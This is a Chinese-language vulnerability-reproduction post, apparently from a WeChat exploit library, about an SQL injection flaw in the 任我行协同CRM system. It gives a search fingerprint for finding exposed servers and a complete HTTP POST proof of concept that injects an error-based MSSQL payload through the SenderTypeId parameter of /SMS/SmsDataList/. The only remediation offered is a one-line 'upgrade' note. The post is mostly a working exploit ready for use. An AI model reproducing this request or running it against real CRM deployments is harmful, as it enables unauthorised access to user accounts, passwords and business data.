#  任我行协同CRM系统SQL注入漏洞 附POC  
安服仔
                    安服仔  北风漏洞复现文库   2026-03-18 01:56  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# 任我行协同CRM系统SQL注入漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS39RoicNnWcaCOCsICBZKicibAPwNFr6teDgqJr8t08SXMssczhSK45ibBFMGLdEuwzwwe1BRy0AnMazOaJLkJQ9YhgmDFuvhzSicv8/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
我行协同  
CRM系统是一款集客户关系管理、办公自动化、目标管理、人力资源管理和知识管理于一体的集成化企业管理软件，旨在帮助企业实现数字化、协同化的运营管理。  
任我行协同CRM系统以客户为管理核心，通过业务管理标准化、工作模式标准化、文化建  
设标准化、知识体系标准化，四大维度，重构企业运营逻辑，助力企业实现管理升级与价值跃迁  
。  
攻击者可通过构造恶意SQL语句，注入并执行非预期的数据库操作，从而获取敏感信息（如用户账号、密码、业务数据等），甚至可能控制服务器。  
  
04  
  
—  
  
资产测绘  
```
title="欢迎使用任我行CRM"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0pZvgcho26w06IH2pRqEsNicVuOVl7fYZ1iaJsNLdmADic8icPtSgNT4BibLUA9X4FMe4E73PWgNMj3wpdGN06Eb3qQdNwq1uKTEqo/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: XXX.XXX.XXX
Connection: close
Cache-Control: max-age=0
sec-ch-ua:"Not:A-Brand";v="99", "Google Chrome";v="145","Chromium";v="145"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0;Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 170
 
 
Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'
and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND
'CvNI'='CvNI
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS273ThF9GmO7UibNhaicibbPYXnzy6ukdyGwia5Fgc6DSCsfeVBakwYAkvRVaA4S0HY5iaxhsiaNlEK0jibr3IMMAXQymDd3dkwklXde4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0Q0MI5sDnXqKmqVUIIm2BXXetWNEHNstRDPCXlyNShmqicPZxUQWf4M6TKXh1Y1AhVFGfwI7ibIeDj5oXPL4kzMicFgSlmjbc8iaI/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
